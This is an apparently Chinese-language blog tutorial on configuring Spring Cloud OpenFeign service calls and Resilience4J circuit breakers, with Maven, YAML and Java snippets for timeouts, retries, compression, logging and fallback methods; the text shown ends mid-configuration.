<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤2：修改主启动类，添加 <code>@EnableFeignClients</code> 注解启用OpenFeign功能</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">@EnableFeignClients(basePackages = &quot;com.fu.apis&quot;)</span></span><br><span class="line"><span class="comment">// 启用feign客户端，定义服务绑定接口，以声明式的方法实现服务调用,basePackages即x</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainFeign80</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ....</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤3：controller编写将使用下面的API而不再使用RestTemplate</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> PayFeignApi payFeignApi;</span><br><span class="line">    <span class="comment">// 不需要restTemplate，也不需要指定服务名，因为API中已经指定</span></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/feign/pay/add&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResultData <span class="title function_">addOrder</span><span class="params">(PayDTO payDTO)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> payFeignApi.addPay(payDTO);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其他类似</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="服务提供者配置"><a href="#服务提供者配置" class="headerlink" title="服务提供者配置"></a>服务提供者配置</h3><p>由【微服务项目构建—工程重构】章节可知，我们将有些各个服务都可能需要的组件&#x2F;API&#x2F;接口&#x2F;工具类等都存入到了一个<strong>通用工具模块</strong>中。而服务提供者对外提供的接口也可能被不同服务调用，因此我们一般也把它放置在通用工具模块中。</p>
<p>以下操作均在通用工具模块进行：</p>
<p><strong>步骤1：引入<code>spring-cloud-starter-openfeign</code>依赖</strong></p>
<p><strong>步骤2：新建一个接口(一般在apis目录下），需要使用注解<code>@FeignClient</code>标明</strong></p>
<ul>
<li>服务名即服务提供者模块的<code>spring-cloud-consul-discovery-service-name</code></li>
</ul>
<p><strong>步骤3：将服务提供者模块的Controller中需要对外暴露的方法提取到接口中</strong></p>
<p>最重要的是访问的URL必须和服务提供者的Controller中的一致，抽象方法名可以不一致，但为了方便查看，一般取同名。同时，方法中从配置消息中读取的参数可以省略。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;cloud-payment-service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PayFeignApi</span> &#123;</span><br><span class="line">    <span class="comment">/** 由于通用模块只有PayDTO没有Pay，因此需要替换</span></span><br><span class="line"><span class="comment">     *  对应原型：</span></span><br><span class="line"><span class="comment">     *  <span class="doctag">@PostMapping</span>(value = &quot;/pay/add&quot;)</span></span><br><span class="line"><span class="comment">     *  public ResultData&lt;String&gt; addPay(<span class="doctag">@RequestBody</span> Pay pay)&#123;</span></span><br><span class="line"><span class="comment">     *      return ResultData.success(&quot;成功插入记录，返回值&quot;+payService.add(pay));</span></span><br><span class="line"><span class="comment">     *  &#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/pay/add&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResultData&lt;String&gt; <span class="title function_">addPay</span><span class="params">(<span class="meta">@RequestBody</span> PayDTO payDTO)</span>;</span><br><span class="line">    <span class="meta">@DeleteMapping(value = &quot;/pay/del/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResultData&lt;Integer&gt; <span class="title function_">deletePay</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PutMapping(value = &quot;/pay/update&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResultData&lt;String&gt; <span class="title function_">updatePay</span><span class="params">(<span class="meta">@RequestBody</span> PayDTO payDTO)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/pay/get/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResultData&lt;PayDTO&gt; <span class="title function_">getById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法中从配置消息中读取的参数可以省略</span></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/pay/info&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="超时控制"><a href="#超时控制" class="headerlink" title="超时控制"></a>超时控制</h3><p>在 OpenFeign 中，<code>ReadTimeout</code> 和 <code>ConnectTimeout</code> 是用于控制 HTTP 请求行为的重要参数。通过合理配置这两个参数，可以有效避免因网络延迟或服务性能问题导致的请求阻塞，提升系统的稳定性和响应能力。</p>
<ul>
<li><code>ConnectTimeout</code> 定义了<strong>客户端尝试连接到目标服务的最长时间</strong>，如果在此时间内未能建立连接，则会抛出连接超时异常。<strong>默认 秒</strong></li>
<li><code>ReadTimeout</code> 规定了<strong>客户端在成功建立连接后，等待服务器返回响应数据的最长时间</strong>，若超过该时间仍未收到响应，将抛出读取超时异常。<strong>默认60秒</strong></li>
</ul>
<h4 id="全局配置超时时间"><a href="#全局配置超时时间" class="headerlink" title="全局配置超时时间"></a>全局配置超时时间</h4><p>在服务调用者（就是CS架构中的客户端身份）的<code>application.yaml</code>文件中通过如下配置项控制：</p>
<ul>
<li><p><code>spring-cloud-openfeign-client-config-default-connect-timeout</code>：单位为毫秒</p>
</li>
<li><p><code>spring-cloud-openfeign-client-config-default-read-timeout</code>：单位为毫秒</p>
</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">openfeign:</span></span><br><span class="line">      <span class="attr">client:</span></span><br><span class="line">        <span class="attr">config:</span></span><br><span class="line">          <span class="attr">default:</span></span><br><span class="line">            <span class="attr">connect-timeout:</span> <span class="number">3000</span></span><br><span class="line">            <span class="attr">read-timeout:</span> <span class="number">3000</span></span><br></pre></td></tr></table></figure>



<h4 id="指定配置超时时间"><a href="#指定配置超时时间" class="headerlink" title="指定配置超时时间"></a>指定配置超时时间</h4><p> 除了指定服务调用者调用其他所有服务时的超时时间外，也可以单独指定它在调用某个服务时的超时时间。在服务调用者（就是CS架构中的客户端身份）的<code>application.yaml</code>文件中通过如下配置项控制：</p>
<ul>
<li><p><code>spring-cloud-openfeign-client-config-[application name]-connect-timeout</code>：单位为毫秒</p>
</li>
<li><p><code>spring-cloud-openfeign-client-config-[application name]-read-timeout</code>：单位为毫秒</p>
</li>
<li><p><code>[application name]</code>是被调用服务的<code>spring-appliaction-name</code>配置项的内容，也是注解<code>@FeignClient(value = &quot;&quot;)</code>的 <strong>value</strong> 值。</p>
</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">openfeign:</span></span><br><span class="line">      <span class="attr">client:</span></span><br><span class="line">        <span class="attr">config:</span></span><br><span class="line">          <span class="attr">cloud-payment-service:</span></span><br><span class="line">            <span class="attr">connect-timeout:</span> <span class="number">3000</span></span><br><span class="line">            <span class="attr">read-timeout:</span> <span class="number">3000</span></span><br></pre></td></tr></table></figure>

<p>当存在全局配置和单独配置时，访问单独配置的服务时遵循单独配置的结果。</p>
<h3 id="重试机制"><a href="#重试机制" class="headerlink" title="重试机制"></a>重试机制</h3><p>默认情况下，OpenFeign的重试机制是关闭的，即服务调用只会调用一次，如果失败直接返回错误。可以通过OpenFeign配置类开启重试机制并设置 ，模板如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FeignConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Retryer <span class="title function_">retryer</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">/* Default()的三个参数</span></span><br><span class="line"><span class="comment">            参数一：period，初始重试间隔时间，单位为毫秒ms</span></span><br><span class="line"><span class="comment">            参数二：maxPeriod，最大重试间隔时间，单位为毫秒ms</span></span><br><span class="line"><span class="comment">            参数三：maxAttempts，最大请求次数</span></span><br><span class="line"><span class="comment">            每次重试时，时间间隔会基于period逐步增加（通常是指数级增长），以避免过于频繁的重试对系统造成压力。</span></span><br><span class="line"><span class="comment">            当计算出的时间间隔超过 maxPeriod 时，实际使用的间隔将固定为 maxPeriod。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Retryer</span>.Default(<span class="number">100</span>,<span class="number">1000</span>,<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h3><p>OpenFeign默认使用JDK自带的HttpURLConnection发送HTTP请求，不支持连接池等技术，性能和效率较低，因此常使用<code>Apache HttpClient5</code>替换默认的HttpURLConnection以提高性能，方法如下：</p>
<p>在服务调用者模块：</p>
<p><strong>步骤1：添加依赖</strong>，必须使用与OpenFeign版本对应的HttpClient5版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents.client5<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- feign-hc5--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-hc5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤2：通过application.yaml配置项开启HttpClient5</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">openfeign:</span></span><br><span class="line">      <span class="attr">httpclient:</span></span><br><span class="line">        <span class="attr">hc5:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>



<h3 id="请求-响应压缩"><a href="#请求-响应压缩" class="headerlink" title="请求&#x2F;响应压缩"></a>请求&#x2F;响应压缩</h3><p>当请求&#x2F;响应传输的数据量较大时，未压缩的数据会占用更多带宽，导致传输速度变慢，尤其在低速网络或高延迟环境下影响更为明显。通过使用压缩技术（如 gzip 或 deflate），可以显著减小数据体积，从而加快传输速度、降低带宽消耗，并提升系统性能和用户体验。这种优化对于处理大量文本数据（如 JSON、XML）的微服务架构尤为重要。OpenFeign 支持请求和响应的压缩功能，用于优化网络传输性能。此功能基于 HTTP 协议的 <code>Content-Encoding</code> 实现，通常使用 gzip 或 deflate 等压缩算法。在 OpenFeign 中，可以通过配置 <code>compression.enabled</code> 参数开启压缩，并设置 <code>compression.level</code> 控制压缩级别，以及通过 <code>compression.mime-types</code> 指定需要压缩的 MIME 类型。启用后，Feign 会在发送请求或接收响应时自动处理数据的压缩与解压，无需额外编码操作。具体配置如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">openfeign:</span></span><br><span class="line">      <span class="attr">compression:</span></span><br><span class="line">        <span class="attr">request:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">mime-types:</span> <span class="string">text/xml,application/xml,application/json</span> <span class="comment">#触发压缩数据类型</span></span><br><span class="line">          <span class="attr">min-request-size:</span> <span class="number">2048</span> <span class="comment">#最小触发压缩的大小</span></span><br><span class="line">        <span class="attr">response:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>





<h3 id="日志打印"><a href="#日志打印" class="headerlink" title="日志打印"></a>日志打印</h3><p>OpenFeign 的日志打印功能用于记录客户端请求和服务器响应的详细信息，帮助开发者调试和监控 Feign 客户端的行为。通过配置日志级别（如 <code>NONE</code>、<code>BASIC</code>、<code>HEADERS</code>、<code>FULL</code>），可以控制日志输出的内容范围，从简单的请求摘要到完整的请求&#x2F;响应数据（包括 headers 和 body）。日志功能需要在配置类中启用，并指定目标客户端及日志级别，通常结合 SLF4J 等日志框架使用。合理配置日志可以帮助快速定位问题，但需注意避免在生产环境输出过多敏感信息或影响性能。具体配置方法如下：</p>
<p><strong>步骤1：在OpenFeign配置类中添加：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">Logger.Level <span class="title function_">feignLoggerLevel</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Logger.Level.FULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤2：在yml文件中开启日志功能</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">com.fu.apis.PayFeignApi:</span> <span class="string">debug</span> <span class="comment"># 配置了@FeignClient注解的Feign接口的全路径名</span></span><br></pre></td></tr></table></figure>



<p>OpenFeign 提供了四种日志级别：</p>
<ul>
<li>**<code>NONE</code>**：不记录任何日志信息，这是默认级别。</li>
<li>**<code>BASIC</code>**：仅记录请求的方法、URL 以及响应的状态码和执行时间，适合了解基本的请求情况。</li>
<li>**<code>HEADERS</code>**：在 BASIC 的基础上，额外记录请求和响应的 headers，便于检查传输的元数据。</li>
<li>**<code>FULL</code>**：记录完整的请求和响应信息，包括 headers、body 和元数据，适合调试时使用，但可能影响性能并暴露敏感数据。</li>
</ul>
<hr>
<h2 id="CircuitBreaker断路器"><a href="#CircuitBreaker断路器" class="headerlink" title="CircuitBreaker断路器"></a>CircuitBreaker断路器</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>前身：Hystrix</p>
<p>Hystrix是一个用于处理分布式系统的延迟和容错的开源库，在分布式系统里，许多依赖不可避免的会调用失败，比如超时、异常等，Hystrix能够保证在一个依赖出问题的情况下，不会导致整体服务失败，避免级联故障，以提高分布式系统的弹性</p>
<p>引入：<strong>服务雪崩</strong></p>
<p>在分布式系统或微服务架构中，由于某个服务出现故障或响应缓慢，导致调用该服务的上游服务也被阻塞，进而引发连锁反应，最终造成整个系统不可用的现象。</p>
<p>具体来说，当一个服务无法及时响应时，调用方会等待超时或重试，这会消耗大量系统资源（如线程池、内存等），使调用方自身也变得不可用。如果这种问题蔓延到更多服务，就会像雪崩一样扩散，最终可能导致整个系统的崩溃。</p>
<p>服务雪崩常见于高并发场景下的微服务架构，通常可以通过引入熔断降级、限流、超时控制和隔离策略（如 Bulkhead 模式）来预防和缓解。</p>
<p>“断路器”本身是一种开关装置，当某个服务单元发生故障之后，通过断路器的故障监控（类似熔断保险丝），向调用方返回一个符合预期的、可处理的备选响应(FallBack)，而不是长时间的等待或者抛出调用方无法处理的异常，这样就保证了服务调用方的线程不会被长时间、不必要地占用，从而避免了故障在分布式系统中的蔓延，乃至雪崩。</p>
<p><a href="https://docs.spring.io/spring-cloud-circuitbreaker/reference/">官网</a>	<a href="https://github.com/spring-cloud/spring-cloud-circuitbreaker">源码</a></p>
<p>CircuitBreaker（断路器）是一种用于提升系统容错性和稳定性的设计模式。它通过监控服务调用的健康状态（如失败率、超时等），在检测到服务不可用或响应缓慢时，暂时切断对该服务的调用，避免因故障扩散导致整个系统崩溃。断路器会进入“打开”状态，在此状态下直接返回降级响应，而不实际发起请求；经过一段时间后，断路器进入“半开”状态，尝试重新调用服务以判断其是否恢复。如果服务恢复正常，则断路器关闭，恢复正常的请求流程。这种机制常用于微服务架构中，与重试、限流等策略结合使用，增强系统的可靠性。CircuitBreaker只是一套规范和接口，它有两种实现方式：</p>
<ul>
<li><code>Resilience4J</code></li>
<li>Spring Retry</li>
</ul>
<p>在微服务架构中，<strong>服务熔断、降级和限流</strong> 是常用的保护机制，用于提高系统的稳定性和可靠性：</p>
<ul>
<li><strong>服务熔断</strong>：当某个服务的错误率或响应时间超过设定阈值时，系统会暂时切断对该服务的调用（类似电路中的断路器），直接返回降级响应，避免故障扩散。一段时间后会尝试恢复调用。</li>
<li><strong>服务降级</strong>：在系统压力过大或依赖的服务不可用时，降低对非核心功能的支持，返回简化的或默认的结果，确保核心功能正常运行。例如，在高并发场景下，可能关闭某些推荐功能以保障订单服务。</li>
<li><strong>服务限流</strong>：通过限制单位时间内请求的数量，防止系统因过多请求而过载。常见的限流策略包括令牌桶算法和漏桶算法，适用于保护关键服务或接口。</li>
</ul>
<h4 id="Resilience4J"><a href="#Resilience4J" class="headerlink" title="Resilience4J"></a>Resilience4J</h4><p><a href="https://docs.spring.io/spring-cloud-circuitbreaker/reference/spring-cloud-circuitbreaker-resilience4j.html">Spring文档</a>      <a href="https://github.com/resilience4j/resilience4j">源码</a>       <a href="https://resilience4j.readme.io/docs/circuitbreaker">官网</a></p>
<p>Resilience4J 是一个轻量级的容错库，专为 Java 及函数式编程设计，用于实现 Circuit Breaker（断路器）等弹性功能。它通过监控服务调用的成功率、失败率或超时情况，动态调整断路器状态（闭合、打开或半开），从而避免故障扩散。  </p>
<p>Resilience4J 的核心特性包括：  </p>
<ul>
<li><strong>模块化设计</strong>：支持熔断器、重试、限流、隔离池等多种功能，可根据需求灵活组合。  </li>
<li><strong>易于集成</strong>：与 Spring Cloud、Micronaut 等框架无缝集成，适合微服务架构。  </li>
<li><strong>指标驱动</strong>：基于滑动窗口或固定时间窗口统计服务健康状态，精准判断是否触发断路。</li>
</ul>
<p>使用 Resilience4J 实现 CircuitBreaker 时，开发者只需配置相关参数（如失败阈值、等待时间）并将其包装到业务逻辑中，即可有效提升系统的稳定性和容错能力。</p>
<h4 id="断路器三个状态的转换"><a href="#断路器三个状态的转换" class="headerlink" title="断路器三个状态的转换"></a>断路器三个状态的转换</h4><p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250224162858.png"></p>
<h4 id="主要配置"><a href="#主要配置" class="headerlink" title="主要配置"></a>主要配置</h4><p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/image-20250224163122711.png"></p>
<h3 id="服务熔断和服务降级"><a href="#服务熔断和服务降级" class="headerlink" title="服务熔断和服务降级"></a>服务熔断和服务降级</h3><p>按如下配置需求设置：</p>
<ul>
<li>6次访问中当执行方法的失败率达到<strong>50%<strong>时</strong>CircuitBreaker</strong>将进入开启<strong>OPEN</strong>状态**(<strong>保险丝跳闸断电</strong>)**拒绝所有请求。</li>
<li>等待<strong>5</strong>秒后，CircuitBreaker将自动从开启<strong>OPEN</strong>状态过渡到半开<strong>HALF_OPEN</strong>状态，允许一些请求通过以测试服务是否恢复正常。<ul>
<li>如还是异常CircuitBreaker 将重新进入开启<strong>OPEN</strong>状态；</li>
<li>如正常将进入关闭<strong>CLOSE</strong>闭合状态恢复正常处理请求。</li>
</ul>
</li>
</ul>
<p><strong>配置步骤：</strong></p>
<p><strong>步骤1：服务调用者（客户端）引入依赖：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--resilience4j-circuitbreaker--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-circuitbreaker-resilience4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 由于断路保护等需要AOP实现，所以必须导入AOP包 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤2：yaml配置文件开启断路器，激活分组</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">openfeign:</span></span><br><span class="line">      <span class="attr">circuitbreaker:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># 是否启用断路器功能。设置为 true 表示启用 Feign 客户端的断路器功能</span></span><br><span class="line">        <span class="attr">group:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># 是否启用断路器分组功能。设置为 true 表示启用将多个 Feign 客户端归类到同一个断路器组中</span></span><br></pre></td></tr></table></figure>



<p>接下来可以根据需要的断路控制方式进行对应设置</p>
<h4 id="计数滑动窗口断路控制"><a href="#计数滑动窗口断路控制" class="headerlink" title="计数滑动窗口断路控制"></a>计数滑动窗口断路控制</h4><p><strong>步骤3：配置按计数决定是否断路</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">resilience4j:</span></span><br><span class="line">  <span class="attr">circuitbreaker:</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">  		<span class="comment">#设置50%的调用失败时打开断路器，超过失败请求百分⽐CircuitBreaker变为OPEN状态。</span></span><br><span class="line">        <span class="attr">failureRateThreshold:</span> <span class="number">50</span> </span><br><span class="line">        <span class="comment"># 滑动窗口的类型</span></span><br><span class="line">        <span class="attr">slidingWindowType:</span> <span class="string">COUNT_BASED</span> </span><br><span class="line">        <span class="comment"># 滑动窗⼝的⼤⼩配置COUNT_BASED表示6个请求，配置TIME_BASED表示6秒</span></span><br><span class="line">        <span class="attr">slidingWindowSize:</span> <span class="number">6</span> </span><br><span class="line">        <span class="comment"># 断路器计算失败率或慢调用率之前所需的最小样本(每个滑动窗口周期)。如果minimumNumberOfCalls为10，则必须最少记录10个样本，然后才能计算失败率。如果只记录了9次调用，即使所有9次调用都失败，断路器也不会开启。</span></span><br><span class="line">        <span class="attr">minimumNumberOfCalls:</span> <span class="number">6</span> </span><br><span class="line">        <span class="comment"># 是否启用自动从开启状态过渡到半开状态，默认值为true。如果启用，CircuitBreaker将自动从开启状态过渡到半开状态，并允许一些请求通过以测试服务是否恢复正常</span></span><br><span class="line">        <span class="attr">automaticTransitionFromOpenToHalfOpenEnabled:</span> <span class="literal">true</span> </span><br><span class="line">        <span class="comment"># 从OPEN到HALF_OPEN状态需要等待的时间</span></span><br><span class="line">        <span class="attr">waitDurationInOpenState:</span> <span class="string">5s</span> </span><br><span class="line">        <span class="comment"># 半开状态允许的最大请求数，默认值为10。在半开状态下，CircuitBreaker将允许最多permittedNumberOfCallsInHalfOpenState个请求通过，如果其中有任何一个请求失败，CircuitBreaker将重新进入开启状态。</span></span><br><span class="line">        <span class="attr">permittedNumberOfCallsInHalfOpenState:</span> <span class="number">2</span> </span><br><span class="line">        <span class="attr">recordExceptions:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">java.lang.Exception</span></span><br><span class="line">    <span class="attr">instances:</span></span><br><span class="line">      <span class="attr">cloud-payment-service:</span></span><br><span class="line">        <span class="attr">baseConfig:</span> <span class="string">default</span>  <span class="comment"># 指定访问服务时使用的配置</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤4：改写服务调用者的Controller，使用注解<code>@CircuitBreaker</code>说明需要保护的服务和服务降级的处理方法</strong></p>
<ul>
<li><code>@CircuitBreaker</code>启用断路器功能：<ul>
<li><code>name</code> 属性定义断路器的名称，便于监控和管理。</li>
<li><code>fallbackMethod</code> 属性指定降级方法，当远程调用失败时会调用该方法。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** CircuitBreaker 注解用于启用断路器功能：</span></span><br><span class="line"><span class="comment">    * - name 属性指定断路器的名称，这里是 &quot;cloud-payment-service&quot;。</span></span><br><span class="line"><span class="comment">    * - fallbackMethod 属性指定当远程调用失败时执行的降级方法，这里是 &quot;myCircuitFallback&quot;。</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> id 路径参数，表示请求中的 ID 值。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> 返回远程支付服务的结果或降级方法的备用结果。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(value = &quot;/feign/pay/circuit/&#123;id&#125;&quot;)</span></span><br><span class="line">   <span class="meta">@CircuitBreaker(name = &quot;cloud-payment-service&quot;, fallbackMethod = &quot;myCircuitFallback&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">myCircuitBreaker</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">       <span class="comment">// 调用 PayFeignApi 的 myCircuit 方法，发起远程服务调用。</span></span><br><span class="line">       <span class="keyword">return</span> payFeignApi.myCircuit(id);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 服务降级后的兜底处理方法。</span></span><br><span class="line"><span class="comment">    * 当远程调用失败时，Spring Cloud 将自动调用此方法作为备用逻辑。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> id 请求中的 ID 参数，与主方法保持一致。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> t 异常对象，表示导致降级的具体异常信息。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> 返回备用响应内容。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">myCircuitFallback</span><span class="params">(Integer id, Throwable t)</span> &#123;</span><br><span class="line">       <span class="comment">// 这里是容错处理逻辑，返回备用结果。</span></span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;myCircuitFallback，系统繁忙，请稍后再试-----/(ㄒoㄒ)/~~&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h4 id="时间滑动窗口断路控制"><a href="#时间滑动窗口断路控制" class="headerlink" title="时间滑动窗口断路控制"></a>时间滑动窗口断路控制</h4><p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250224174430.png"></p>
<p><strong>步骤3：配置按时间决定是否断路</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">resilience4j:</span></span><br><span class="line">  <span class="comment"># timelimiter配置项不是断路器需要的配置，而是在实验过程中为了演示配置的</span></span><br><span class="line">  <span class="attr">timelimiter:</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">      <span class="comment"># 设置方法执行的最大超时时间，超过该时间将抛出 TimeoutException</span></span><br><span class="line">      <span class="comment"># 神坑的位置，timelimiter 默认限制远程1s，超于1s就超时异常，配置了降级，就走降级逻辑</span></span><br><span class="line">      <span class="comment"># 如果采用默认的1秒，那么我们配置断路器时就与我们设置的慢调用冲突了，即还没达到慢调用就超时执行降级逻辑了</span></span><br><span class="line">        <span class="attr">timeout-duration:</span> <span class="string">10s</span> </span><br><span class="line">  <span 